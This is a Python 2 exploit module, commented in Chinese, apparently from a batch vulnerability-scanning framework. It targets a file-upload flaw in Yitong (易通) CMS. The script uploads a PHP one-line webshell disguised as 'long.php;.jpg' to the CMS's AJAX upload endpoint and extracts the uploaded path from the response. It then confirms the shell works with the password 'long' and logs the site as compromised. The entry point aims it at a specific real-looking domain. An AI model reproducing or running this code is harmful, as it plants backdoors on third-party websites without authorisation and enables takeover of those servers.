#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#############################易通cms上传shell漏洞###########################
#参考http://www.shack2.org/article/168.html
import urllib2
import sys
import UPLOAD   #上传组件
import re
import threading
sys.path.append('..')
import Class_Queue
import yijuhua_CS

class etcms_Upload_shell(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #URL
        self.scan("http://"+self.url)
        #print "%s close--etcms_Upload_shell!!!!!"%(self.url)

    def scan(self,arg):
        try:
            opener = urllib2.build_opener(UPLOAD.MultipartPostHandler)
            params = {"fileToUpload" : open("long.php;.jpg","rb")}
            url = arg.strip()+'/celive/live/doajaxfileupload.php'
            req = opener.open(url,params)
            html = req.read()
            murl = re.compile("<a href='(.*?)'")
            ok = murl.findall(html)
            if ok and '.php;.jpg' in ok[0]:
                if yijuhua_CS.yijuhua_cs("php",ok[0],"long"):   #ASP还是PHP  ,URL地址 ，密码
                #是
                    EXP_list=[1,self.url,"exp","exp_etcms_Upload_shell",ok[0],"long","webshell"]
                    #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                    Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
                else:
                #否
                    EXP_list=[0,self.url,"exp","exp_etcms_Upload_shell",ok[0],"long","webshell"]
                    #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                    Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
#                print "exp_kingcms_getshell---%s---%s"%(ok[0],"webshell--pass:long")
        except Exception,e:
            #print e
            pass


################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(etcms_Upload_shell("fanyigongsi.name"))

    for t in threads:
        t.start()

















